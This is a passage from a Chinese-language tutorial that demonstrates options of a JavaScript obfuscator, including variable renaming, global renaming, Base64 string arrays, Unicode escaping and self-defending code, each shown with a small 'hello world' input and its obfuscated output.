</span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (--f) &#123;</span><br><span class="line">      c[<span class="string">"push"</span>](c[<span class="string">"shift"</span>]());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  e(++d);</span><br><span class="line">&#125;)(a, <span class="number">0x9b</span>);</span><br><span class="line"><span class="keyword">var</span> b = <span class="function"><span class="keyword">function</span> (<span class="params">c, d</span>) </span>&#123;</span><br><span class="line">  c = c - <span class="number">0x0</span>;</span><br><span class="line">  <span class="keyword">var</span> e = a[c];</span><br><span class="line">  <span class="keyword">return</span> e;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">let</span> hello = <span class="string">"1"</span> + <span class="number">0x1</span>;</span><br><span class="line"><span class="built_in">console</span>[<span class="string">"log"</span>](b(<span class="string">"0x0"</span>), hello);</span><br></pre>      </td>    </tr>  </table></figure><p>可以看到这里的变量命名都变成了 <code>a</code>、<code>b</code> 等形式。</p><p>如果我们将 identifierNamesGenerator 修改为 hexadecimal 或者不设置，运行结果如下：</p><figure class="highlight javascript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">var</span> _0x4e98 = [<span class="string">"log"</span>, <span class="string">"hello"</span>];</span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">_0x4464de, _0x39de6c</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> _0xdffdda = <span class="function"><span class="keyword">function</span> (<span class="params">_0x6a95d5</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (--_0x6a95d5) &#123;</span><br><span class="line">      _0x4464de[<span class="string">"push"</span>](_0x4464de[<span class="string">"shift"</span>]());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  _0xdffdda(++_0x39de6c);</span><br><span class="line">&#125;)(_0x4e98, <span class="number">0xc8</span>);</span><br><span class="line"><span class="keyword">var</span> _0x53cb = <span class="function"><span class="keyword">function</span> (<span class="params">_0x393bda, _0x8504e7</span>) </span>&#123;</span><br><span class="line">  _0x393bda = _0x393bda - <span class="number">0x0</span>;</span><br><span class="line">  <span class="keyword">var</span> _0x46ab80 = _0x4e98[_0x393bda];</span><br><span class="line">  <span class="keyword">return</span> _0x46ab80;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">let</span> hello = <span class="string">"1"</span> + <span class="number">0x1</span>;</span><br><span class="line"><span class="built_in">console</span>[_0x53cb(<span class="string">"0x0"</span>)](_0x53cb(<span class="string">"0x1"</span>), hello);</span><br></pre>      </td>    </tr>  </table></figure><p>可以看到选用了 mangled，其代码体积会更小，但 hexadecimal 其可读性会更低。</p><p>另外我们还可以通过设置 identifiersPrefix 参数来控制混淆后的变量前缀，示例如下：</p><figure class="highlight javascript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">const</span> code = <span class="string">`</span></span><br><span class="line"><span class="string">let hello = '1' + 1</span></span><br><span class="line"><span class="string">console.log('hello', hello)</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">const</span> options = &#123;</span><br><span class="line">  identifiersPrefix: <span class="string">"germey"</span>,</span><br><span class="line">&#125;;</span><br></pre>      </td>    </tr>  </table></figure><p>运行结果如下：</p><figure class="highlight javascript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">var</span> germey_0x3dea = [<span class="string">"log"</span>, <span class="string">"hello"</span>];</span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">_0x348ff3, _0x5330e8</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> _0x1568b1 = <span class="function"><span class="keyword">function</span> (<span class="params">_0x4740d8</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (--_0x4740d8) &#123;</span><br><span class="line">      _0x348ff3[<span class="string">"push"</span>](_0x348ff3[<span class="string">"shift"</span>]());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  _0x1568b1(++_0x5330e8);</span><br><span class="line">&#125;)(germey_0x3dea, <span class="number">0x94</span>);</span><br><span class="line"><span class="keyword">var</span> germey_0x30e4 = <span class="function"><span class="keyword">function</span> (<span class="params">_0x2e8f7c, _0x1066a8</span>) </span>&#123;</span><br><span class="line">  _0x2e8f7c = _0x2e8f7c - <span class="number">0x0</span>;</span><br><span class="line">  <span class="keyword">var</span> _0x5166ba = germey_0x3dea[_0x2e8f7c];</span><br><span class="line">  <span class="keyword">return</span> _0x5166ba;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">let</span> hello = <span class="string">"1"</span> + <span class="number">0x1</span>;</span><br><span class="line"><span class="built_in">console</span>[germey_0x30e4(<span class="string">"0x0"</span>)](germey_0x30e4(<span class="string">"0x1"</span>), hello);</span><br></pre>      </td>    </tr>  </table></figure><p>可以看到混淆后的变量前缀加上了我们自定义的字符串 germey。</p><p>另外 renameGlobals 这个参数还可以指定是否混淆全局变量和函数名称，默认为 false。示例如下：</p><figure class="highlight javascript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">const</span> code = <span class="string">`</span></span><br><span class="line"><span class="string">var $ = function(id) &#123;</span></span><br><span class="line"><span class="string">    return document.getElementById(id);</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">const</span> options = &#123;</span><br><span class="line">  renameGlobals: <span class="literal">true</span>,</span><br><span class="line">&#125;;</span><br></pre>      </td>    </tr>  </table></figure><p>运行结果如下：</p><figure class="highlight javascript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">var</span> _0x4864b0 = <span class="function"><span class="keyword">function</span> (<span class="params">_0x5763be</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">document</span>[<span class="string">"getElementById"</span>](_0x5763be);</span><br><span class="line">&#125;;</span><br></pre>      </td>    </tr>  </table></figure><p>可以看到这里我们声明了一个全局变量 <script type="math/tex">`，在 renameGlobals 设置为 true 之后，`</script> 这个变量也被替换了。如果后文用到了这个 <code>$</code> 对象，可能就会有找不到定义的错误，因此这个参数可能导致代码执行不通。</p><p>如果我们不设置 renameGlobals 或者设置为 false，结果如下：</p><figure class="highlight javascript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">var</span> _0x239a = [<span class="string">"getElementById"</span>];</span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">_0x3f45a3, _0x583dfa</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> _0x2cade2 = <span class="function"><span class="keyword">function</span> (<span class="params">_0x28479a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (--_0x28479a) &#123;</span><br><span class="line">      _0x3f45a3[<span class="string">"push"</span>](_0x3f45a3[<span class="string">"shift"</span>]());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  _0x2cade2(++_0x583dfa);</span><br><span class="line">&#125;)(_0x239a, <span class="number">0xe1</span>);</span><br><span class="line"><span class="keyword">var</span> _0x3758 = <span class="function"><span class="keyword">function</span> (<span class="params">_0x18659d, _0x50c21d</span>) </span>&#123;</span><br><span class="line">  _0x18659d = _0x18659d - <span class="number">0x0</span>;</span><br><span class="line">  <span class="keyword">var</span> _0x531b8d = _0x239a[_0x18659d];</span><br><span class="line">  <span class="keyword">return</span> _0x531b8d;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> $ = <span class="function"><span class="keyword">function</span> (<span class="params">_0x3d8723</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">document</span>[_0x3758(<span class="string">"0x0"</span>)](_0x3d8723);</span><br><span class="line">&#125;;</span><br></pre>      </td>    </tr>  </table></figure><p>可以看到，最后还是有 <code>$</code> 的声明，其全局名称没有被改变。</p><h3 id="字符串混淆"><a href="#字符串混淆" class="headerlink" title="字符串混淆"></a>字符串混淆</h3><p>字符串混淆，即将一个字符串声明放到一个数组里面，使之无法被直接搜索到。我们可以通过控制 stringArray 参数来控制，默认为 true。</p><p>我们还可以通过 rotateStringArray 参数来控制数组化后结果的的元素顺序，默认为 true。还可以通过 stringArrayEncoding 参数来控制数组的编码形式，默认不开启编码，如果设置为 true 或 base64，则会使用 Base64 编码，如果设置为 rc4，则使用 RC4 编码。另外可以通过 stringArrayThreshold 来控制启用编码的概率，范围 0 到 1，默认 0.8。</p><p>示例如下：</p><figure class="highlight javascript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">const</span> code = <span class="string">`</span></span><br><span class="line"><span class="string">var a = 'hello world'   </span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">const</span> options = &#123;</span><br><span class="line">  stringArray: <span class="literal">true</span>,</span><br><span class="line">  rotateStringArray: <span class="literal">true</span>,</span><br><span class="line">  stringArrayEncoding: <span class="literal">true</span>, <span class="comment">// 'base64' 或 'rc4' 或 false</span></span><br><span class="line">  stringArrayThreshold: <span class="number">1</span>,</span><br><span class="line">&#125;;</span><br></pre>      </td>    </tr>  </table></figure><p>运行结果如下：</p><figure class="highlight javascript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">var</span> _0x4215 = [<span class="string">"aGVsbG8gd29ybGQ="</span>];</span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">_0x42bf17, _0x4c348f</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> _0x328832 = <span class="function"><span class="keyword">function</span> (<span class="params">_0x355be1</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (--_0x355be1) &#123;</span><br><span class="line">      _0x42bf17[<span class="string">"push"</span>](_0x42bf17[<span class="string">"shift"</span>]());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  _0x328832(++_0x4c348f);</span><br><span class="line">&#125;)(_0x4215, <span class="number">0x1da</span>);</span><br><span class="line"><span class="keyword">var</span> _0x5191 = <span class="function"><span class="keyword">function</span> (<span class="params">_0x3cf2ba, _0x1917d8</span>) </span>&#123;</span><br><span class="line">  _0x3cf2ba = _0x3cf2ba - <span class="number">0x0</span>;</span><br><span class="line">  <span class="keyword">var</span> _0x1f93f0 = _0x4215[_0x3cf2ba];</span><br><span class="line">  <span class="keyword">if</span> (_0x5191[<span class="string">"LqbVDH"</span>] === <span class="literal">undefined</span>) &#123;</span><br><span class="line">    (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> _0x5096b2;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> _0x282db1 = <span class="built_in">Function</span>(</span><br><span class="line">          <span class="string">"return\x20(function()\x20"</span> +</span><br><span class="line">            <span class="string">"&#123;&#125;.constructor(\x22return\x20this\x22)(\x20)"</span> +</span><br><span class="line">            <span class="string">");"</span></span><br><span class="line">        );</span><br><span class="line">        _0x5096b2 = _0x282db1();</span><br><span class="line">      &#125; <span class="keyword">catch</span> (_0x2acb9c) &#123;</span><br><span class="line">        _0x5096b2 = <span class="built_in">window</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">var</span> _0x388c14 =</span><br><span class="line">        <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="</span>;</span><br><span class="line">      _0x5096b2[<span class="string">"atob"</span>] ||</span><br><span class="line">        (_0x5096b2[<span class="string">"atob"</span>] = <span class="function"><span class="keyword">function</span> (<span class="params">_0x4cc27c</span>) </span>&#123;</span><br><span class="line">          <span class="keyword">var</span> _0x2af4ae = <span class="built_in">String</span>(_0x4cc27c)[<span class="string">"replace"</span>](<span class="regexp">/=+$/</span>, <span class="string">""</span>);</span><br><span class="line">          <span class="keyword">for</span> (</span><br><span class="line">            <span class="keyword">var</span> _0x21400b = <span class="number">0x0</span>,</span><br><span class="line">              _0x3f4e2e,</span><br><span class="line">              _0x5b193b,</span><br><span class="line">              _0x233381 = <span class="number">0x0</span>,</span><br><span class="line">              _0x3dccf7 = <span class="string">""</span>;</span><br><span class="line">            (_0x5b193b = _0x2af4ae[<span class="string">"charAt"</span>](_0x233381++));</span><br><span class="line">            ~_0x5b193b &amp;&amp;</span><br><span class="line">            ((_0x3f4e2e =</span><br><span class="line">              _0x21400b % <span class="number">0x4</span> ? _0x3f4e2e * <span class="number">0x40</span> + _0x5b193b : _0x5b193b),</span><br><span class="line">            _0x21400b++ % <span class="number">0x4</span>)</span><br><span class="line">              ? (_0x3dccf7 += <span class="built_in">String</span>[<span class="string">"fromCharCode"</span>](</span><br><span class="line">                  <span class="number">0xff</span> &amp; (_0x3f4e2e &gt;&gt; ((<span class="number">-0x2</span> * _0x21400b) &amp; <span class="number">0x6</span>))</span><br><span class="line">                ))</span><br><span class="line">              : <span class="number">0x0</span></span><br><span class="line">          ) &#123;</span><br><span class="line">            _0x5b193b = _0x388c14[<span class="string">"indexOf"</span>](_0x5b193b);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">return</span> _0x3dccf7;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;)();</span><br><span class="line">    _0x5191[<span class="string">"DuIurT"</span>] = <span class="function"><span class="keyword">function</span> (<span class="params">_0x51888e</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> _0x29801f = atob(_0x51888e);</span><br><span class="line">      <span class="keyword">var</span> _0x561e62 = [];</span><br><span class="line">      <span class="keyword">for</span> (</span><br><span class="line">        <span class="keyword">var</span> _0x5dd788 = <span class="number">0x0</span>, _0x1a8b73 = _0x29801f[<span class="string">"length"</span>];</span><br><span class="line">        _0x5dd788 &lt; _0x1a8b73;</span><br><span class="line">        _0x5dd788++</span><br><span class="line">      ) &#123;</span><br><span class="line">        _0x561e62 +=</span><br><span class="line">          <span class="string">"%"</span> +</span><br><span class="line">          (<span class="string">"00"</span> + _0x29801f[<span class="string">"charCodeAt"</span>](_0x5dd788)[<span class="string">"toString"</span>](<span class="number">0x10</span>))[</span><br><span class="line">            <span class="string">"slice"</span></span><br><span class="line">          ](<span class="number">-0x2</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">decodeURIComponent</span>(_0x561e62);</span><br><span class="line">    &#125;;</span><br><span class="line">    _0x5191[<span class="string">"mgoBRd"</span>] = &#123;&#125;;</span><br><span class="line">    _0x5191[<span class="string">"LqbVDH"</span>] = !![];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> _0x1741f0 = _0x5191[<span class="string">"mgoBRd"</span>][_0x3cf2ba];</span><br><span class="line">  <span class="keyword">if</span> (_0x1741f0 === <span class="literal">undefined</span>) &#123;</span><br><span class="line">    _0x1f93f0 = _0x5191[<span class="string">"DuIurT"</span>](_0x1f93f0);</span><br><span class="line">    _0x5191[<span class="string">"mgoBRd"</span>][_0x3cf2ba] = _0x1f93f0;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    _0x1f93f0 = _0x1741f0;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> _0x1f93f0;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> a = _0x5191(<span class="string">"0x0"</span>);</span><br></pre>      </td>    </tr>  </table></figure><p>可以看到这里就把字符串进行了 Base64 编码，我们再也无法通过查找的方式找到字符串的位置了。</p><p>如果将 stringArray 设置为 false 的话，输出就是这样：</p><figure class="highlight javascript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">var</span> a = <span class="string">"hello\x20world"</span>;</span><br></pre>      </td>    </tr>  </table></figure><p>字符串就仍然是明文显示的，没有被编码。</p><p>另外我们还可以使用 unicodeEscapeSequence 这个参数对字符串进行 Unicode 转码，使之更加难以辨认，示例如下：</p><figure class="highlight javascript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">const</span> code = <span class="string">`</span></span><br><span class="line"><span class="string">var a = 'hello world'</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">const</span> options = &#123;</span><br><span class="line">  compact: <span class="literal">false</span>,</span><br><span class="line">  unicodeEscapeSequence: <span class="literal">true</span>,</span><br><span class="line">&#125;;</span><br></pre>      </td>    </tr>  </table></figure><p>运行结果如下：</p><figure class="highlight javascript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">var</span> _0x5c0d = [<span class="string">"\x68\x65\x6c\x6c\x6f\x20\x77\x6f\x72\x6c\x64"</span>];</span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">_0x54cc9c, _0x57a3b2</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> _0xf833cf = <span class="function"><span class="keyword">function</span> (<span class="params">_0x3cd8c6</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (--_0x3cd8c6) &#123;</span><br><span class="line">      _0x54cc9c[<span class="string">"push"</span>](_0x54cc9c[<span class="string">"shift"</span>]());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  _0xf833cf(++_0x57a3b2);</span><br><span class="line">&#125;)(_0x5c0d, <span class="number">0x17d</span>);</span><br><span class="line"><span class="keyword">var</span> _0x28e8 = <span class="function"><span class="keyword">function</span> (<span class="params">_0x3fd645, _0x2cf5e7</span>) </span>&#123;</span><br><span class="line">  _0x3fd645 = _0x3fd645 - <span class="number">0x0</span>;</span><br><span class="line">  <span class="keyword">var</span> _0x298a20 = _0x5c0d[_0x3fd645];</span><br><span class="line">  <span class="keyword">return</span> _0x298a20;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> a = _0x28e8(<span class="string">"0x0"</span>);</span><br></pre>      </td>    </tr>  </table></figure><p>可以看到，这里字符串被数字化和 Unicode 化，非常难以辨认。</p><p>在很多 JavaScript 逆向的过程中，一些关键的字符串可能会作为切入点来查找加密入口。用了这种混淆之后，如果有人想通过全局搜索的方式搜索 hello 这样的字符串找加密入口，也没法搜到了。</p><h3 id="代码自我保护"><a href="#代码自我保护" class="headerlink" title="代码自我保护"></a>代码自我保护</h3><p>我们可以通过设置 selfDefending 参数来开启代码自我保护功能。开启之后，混淆后的 JavaScript 会以强制一行形式显示，如果我们将混淆后的代码进行格式化或者重命名，该段代码将无法执行。</p><p>示例如下：</p><figure class="highlight javascript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">const</span> code = <span class="string">`</span></span><br><span class="line"><span class="string">console.log('hello world')</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">const</span> options = &#123;</span><br><span class="line">  selfDefending: <span class="literal">true</span>,</span><br><span class="line">&#125;;</span><br></pre>      </td>    </tr>  </table></figure><p>运行结果如下：</p><figure class="highlight javascript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">var</span> _0x26da = [<span class="string">"log"</span>, <span class="string">"hello\x20world"</span>];</span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">_0x190327, _0x57c2c0</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> _0x577762 = <span class="function"><span class="keyword">function</span> (<span class="params">_0xc9dabb</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (--_0xc9dabb) &#123;</span><br><span class="line">      _0x190327[<span class="string">"push"</span>](_0x190327[<span class="string">"shift"</span>]());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">var</span> _0x35976e = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> _0x16b3fe = &#123;</span><br><span class="line">      data: &#123; <span class="attr">key</span>: <span class="string">"cookie"</span>, <span class="attr">value</span>: <span class="string">"timeout"</span> &#125;,</span><br><span class="line">      setCookie: <span class="function"><span class="keyword">function</span> (<span class="params">_0x2d52d5, _0x16feda, _0x57cadf, _0x56056f</span>) </span>&#123;</span><br><span class="line">        _0x56056f = _0x56056f || &#123;&#125;;</span><br><span class="line">        <span class="keyword">var</span> _0x5b6dc3 = _0x16feda + <span class="string">"="</span> + _0x57cadf;</span><br><span class="line">        <span class="keyword">var</span> _0x333ced = <span class="number">0x0</span>;</span><br><span class="line">        <span class="keyword">for</span> (</span><br><span class="line">          <span class="keyword">var</span> _0x333ced = <span class="number">0x0</span>, _0x19ae36 = _0x2d52d5[<span class="string">"length"</span>];</span><br><span class="line">          _0x333ced &lt; _0x19ae36;</span><br><span class="line">          _0x333ced++</span><br><span class="line">        ) &#123;</span><br><span class="line">          <span class="keyword">var</span> _0x409587 = _0x2d52d5[_0x333ced];</span><br><span class="line">          _0x5b6dc3 += <span class="string">";\x20"</span> + _0x409587;</span><br><span class="line">          <span class="keyword">var</span> _0x4aa006 = _0x2d52d5[_0x409587];</span><br><span class="line">          _0x2d52d5[<span class="string">"push"</span>](_0x4aa006);</span><br><span class="line">          _0x19ae36 = _0x2d52d5[<span class="string">"length"</span>];</span><br><span class="line">          <span class="keyword">if</span> (_0x4aa006 !== !![]) &#123;</span><br><span class="line">            _0x5b6dc3 += <span class="string">"="</span> + _0x4aa006;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        _0x56056f[<span class="string">"cookie"</span>] = _0x5b6dc3;</span><br><span class="line">      &#125;,</span><br><span class="line">      removeCookie: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"dev"</span>;</span><br><span class="line">      &#125;,</span><br><span class="line">      getCookie: <span class="function"><span class="keyword">function</span> (<span class="params">_0x30c497, _0x51923d</span>) </span>&#123;</span><br><span class="line">        _0x30c497 =</span><br><span class="line">          _0x30c497 ||</span><br><span class="line">          <span class="function"><span class="keyword">function</span> (<span class="params">_0x4b7e18</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> _0x4b7e18;</span><br><span class="line">          &#125;;</span><br><span class="line">        <span class="keyword">var</span> _0x557e06 = 